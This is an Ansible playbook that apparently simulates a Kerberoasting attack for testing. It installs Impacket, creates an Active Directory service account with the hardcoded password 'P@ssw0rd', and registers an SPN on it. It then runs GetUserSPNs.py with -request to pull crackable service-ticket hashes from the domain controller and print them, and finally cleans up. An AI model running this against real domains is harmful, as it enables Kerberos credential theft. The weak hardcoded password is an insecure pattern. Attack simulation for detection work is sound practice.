# Download Impacket and install dependencies
- name: Download and unarchive impacket
  ansible.builtin.unarchive:
    src: https://github.com/fortra/impacket/releases/download/impacket_0_12_0/impacket-0.12.0.tar.gz
    dest: /tmp
    remote_src: yes
  delegate_to: localhost

- name: Append impacket into requirements.txt
  ansible.builtin.lineinfile:
    path: /tmp/impacket-0.12.0/requirements.txt
    line: "impacket"
    insertafter: EOF
  delegate_to: localhost

- name: Install virtualenv via apt package
  ansible.builtin.apt:
    name: python3-virtualenv
    update_cache: yes
  delegate_to: localhost

- name: Install specified python requirements in indicated (virtualenv)
  ansible.builtin.pip:
    requirements: /tmp/impacket-0.12.0/requirements.txt
    virtualenv: /tmp/impacket-0.12.0/venv
  delegate_to: localhost

# Create service account and set spn
- name: Create service account
  microsoft.ad.user:
    identity: sqlsvc
    password: P@ssw0rd
    password_expired: no
    password_never_expires: yes
    state: present

- name: Set SPN for service account
  ansible.windows.win_command: "setspn -s http/{{ spn_fqdn }} {{ domain_name }}\\sqlsvc"

# Run impacket
- name: Run GetUserSPNs.py
  ansible.builtin.script:
    cmd: "/tmp/impacket-0.12.0/examples/GetUserSPNs.py {{ domain_name }}/{{ ansible_user }}:{{ ansible_password }} -dc-ip {{ ansible_host }} -request"
    executable: /tmp/impacket-0.12.0/venv/bin/python
  delegate_to: localhost
  register: kerberoasting_output

- name: Print kerberoasting output
  ansible.builtin.debug:
    msg: "{{ kerberoasting_output.stdout }}"

# Cleanup
- name: Delete impacket
  ansible.builtin.file:
    path: /tmp/impacket-0.12.0
    state: absent
  delegate_to: localhost

- name: Unset SPN for service account
  ansible.windows.win_command: "setspn -D http/{{ spn_fqdn }} {{ domain_name }}\\sqlsvc"

- name: Delete service account
  microsoft.ad.user:
      identity: sqlsvc
      state: absent